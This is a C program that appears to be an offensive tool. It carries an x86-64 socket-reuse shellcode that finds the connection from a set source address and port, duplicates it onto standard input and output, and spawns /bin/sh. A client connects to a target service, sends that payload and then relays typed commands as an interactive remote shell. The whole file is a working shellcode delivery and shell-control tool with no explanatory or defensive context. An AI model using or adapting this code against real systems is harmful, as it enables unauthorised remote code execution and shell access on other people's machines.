#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
 
// source: 127.0.0.1:1234
char shellcode[] = {
"\xeb\x05\x6a\x3c\x58\x0f\x05\x6a\x02\x5f\x48\x8d\x54\x24\xec\xc6"
"\x02\x10\x48\x8d\x72\x04\xff\xc7\x66\x85\xff\x74\xe5\x48\x8d\x62"
"\x14\x48\x83\xec\x20\x6a\x34\x58\x0f\x05\x84\xc0\x75\xe8\x6a\x1b"
"\x59\xbb\x80\xff\xff\xfe\xf7\xd3\x39\x1c\x8c\x75\xd9\xb1\x35\x66"
"\xbb\xfb\x2d\x66\xf7\xd3\x66\x39\x1c\x4c\x75\xca\x50\x5e\x6a\x21"
"\x58\x0f\x05\xff\xc6\x83\xfe\x04\x75\xf4\x5f\x57\x57\x5e\x5a\x48"
"\xbf\x6a\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f"
"\x6a\x3b\x58\x0f\x05"
};
 
void error(char *err) {
  perror(err);
  exit(0);
}
 
int main(int argc, char *argv[]) {
  struct sockaddr_in server_addr, bind_addr;
  struct hostent* server, *_bind;
  char buf[1024], inbuf[1024];
  int sock;
 
  _bind = gethostbyname(argv[3]);
  bind_addr.sin_family = AF_INET;
  bind_addr.sin_port   = htons(atoi(argv[4]));
  memcpy(&bind_addr.sin_addr.s_addr, _bind->h_addr, _bind->h_length);
 
  server = gethostbyname(argv[1]);
  server_addr.sin_family = AF_INET;
  memcpy(&server_addr.sin_addr.s_addr, server->h_addr, server->h_length);
  server_addr.sin_port = htons(atoi(argv[2]));
 
  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    error(" [!] socket()");
 
  if (bind(sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0)
    error(" [!] bind()");
 
  printf(" [*] Connecting to %s\n", argv[1]);
  if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    error(" [*] connect()");
 
  printf(" [*] Sending payload\n");
  if (send(sock, shellcode, strlen(shellcode), MSG_NOSIGNAL) < 0)
    error(" [!] write()");
 
  while(fgets(buf, 1024, stdin) != NULL) {
    if (send(sock, buf, strlen(buf), MSG_NOSIGNAL) < 0)
      error(" [!] write(): ");
    if (recv(sock, inbuf, 1024, 0) < 0)
      error(" [!] read(): ");
    printf("%s", inbuf);
    memset(inbuf, 0, 1024);
    memset(buf, 0, 1024);
  }
 
  return 0;
}
